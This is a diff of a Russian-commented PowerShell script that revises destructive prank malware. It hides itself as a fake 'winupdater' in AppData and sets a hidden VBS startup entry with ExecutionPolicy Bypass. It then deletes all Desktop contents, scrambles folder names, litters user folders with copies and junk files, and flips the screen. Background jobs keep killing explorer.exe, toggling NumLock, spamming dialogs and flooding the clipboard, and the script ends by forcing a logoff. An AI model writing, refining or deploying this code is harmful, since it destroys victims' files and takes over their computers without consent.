@@ -1,41 +1,41 @@
-# === Спрятать себя в скрытую папку и запустить оттуда ===
-$hiddenDir = "$env:APPDATA\Microsoft\Windows\winupdater"
-$autostart = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.vbs"
-if (-not (Test-Path $hiddenDir)) {
-    New-Item -ItemType Directory -Force -Path $hiddenDir | Out-Null
-}
-$selfPath = "$hiddenDir\winupdater.ps1"
-Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $selfPath -Force
+# === Конфигурация путей ===
+$targetDir = "$env:APPDATA\Microsoft\Windows\winupdater"
+$targetPs1 = "$targetDir\winupdater.ps1"
+$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.vbs"
 
-# Добавление в автозагрузку через VBS (обходит блокировку .ps1)
-$vbs = @"
+# === Если не запущен из целевой папки — копируем себя и запускаем оттуда ===
+if ($MyInvocation.MyCommand.Path -ne $targetPs1) {
+    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $targetPs1 -Force
+
+    $vbs = @"
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -windowstyle hidden -ExecutionPolicy Bypass -File `"$selfPath`"", 0
+WshShell.Run "powershell -windowstyle hidden -ExecutionPolicy Bypass -File ""$targetPs1""", 0
 "@
-Set-Content -Path $autostart -Value $vbs -Encoding ASCII
+    Set-Content -Path $vbsPath -Value $vbs -Encoding ASCII
 
-# === Очистка Desktop ===
+    Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
+    exit
+}
+
+# === Основная движуха начинается тут ===
+
+# Удалить всё с рабочего стола
 Remove-Item "$env:USERPROFILE\Desktop\*" -Recurse -Force -ErrorAction SilentlyContinue
 
-# === Перемешка названий папок на Desktop ===
+# Перемешать названия папок на рабочем столе
 $folders = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
 $names = $folders.Name | Sort-Object {Get-Random}
 for ($i = 0; $i -lt $folders.Count; $i++) {
-    $tempName = "temp_$([System.Guid]::NewGuid().ToString().Substring(0, 5))"
-    Rename-Item $folders[$i].FullName $tempName
+    Rename-Item $folders[$i].FullName -NewName "temp_$i"
 }
 $renamed = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
 for ($i = 0; $i -lt $renamed.Count; $i++) {
-    Rename-Item $renamed[$i].FullName $names[$i]
+    Rename-Item $renamed[$i].FullName -NewName $names[$i]
 }
 
-# === Копии файлов + беспорядок в других папках ===
-$targets = @(
-    "$env:USERPROFILE\Desktop",
-    "$env:USERPROFILE\Documents",
-    "$env:USERPROFILE\Downloads",
-    "$env:USERPROFILE\Pictures"
-)
+# Копии файлов и действия в других папках
+$targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures")
 foreach ($t in $targets) {
     if (Test-Path $t) {
         Get-ChildItem $t -File | ForEach-Object {
@@ -44,22 +44,31 @@ foreach ($t in $targets) {
     }
 }
 
-# === Перевернуть экран
+# Перевернуть экран
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.SendKeys]::SendWait('^{%DOWN}')
 
-# === Фоновые задачи ===
+# explorer.exe убийство
 Start-Job -ScriptBlock {
     while ($true) { taskkill /f /im explorer.exe; Start-Sleep 5 }
 }
+
+# Блокировка клавиатуры
 Start-Job -ScriptBlock {
     $wsh = New-Object -ComObject WScript.Shell
     while ($true) { $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 100 }
 }
+
+# Вложенные папки
 Start-Job -ScriptBlock {
     $path = "$env:USERPROFILE\Desktop\maze"
-    for ($i=0;$i -lt 100;$i++) { $path += "\$i"; New-Item -Path $path -ItemType Directory -Force | Out-Null }
+    for ($i=0;$i -lt 100;$i++) {
+        $path += "\$i"
+        New-Item -Path $path -ItemType Directory -Force | Out-Null
+    }
 }
+
+# Спам сообщениями
 Add-Type -AssemblyName PresentationFramework
 Start-Job -ScriptBlock {
     while ($true) {
@@ -67,12 +76,16 @@ Start-Job -ScriptBlock {
         Start-Sleep -Milliseconds 500
     }
 }
+
+# Мусорные файлы
 Start-Job -ScriptBlock {
     for ($i=0;$i -lt 500;$i++) {
         $folder = Get-Random -InputObject $targets
         New-Item "$folder\garbage_$i.txt" -Value "LOL" | Out-Null
     }
 }
+
+# Мусор в буфере
 Start-Job -ScriptBlock {
     while ($true) {
         Set-Clipboard -Value ('HAHAHA'*(Get-Random -Minimum 100 -Maximum 1000))
@@ -80,6 +93,6 @@ Start-Job -ScriptBlock {
     }
 }
 
-# 5 минут адского веселья
+# Выход через 5 минут
 Start-Sleep -Seconds 300
 shutdown /l /f
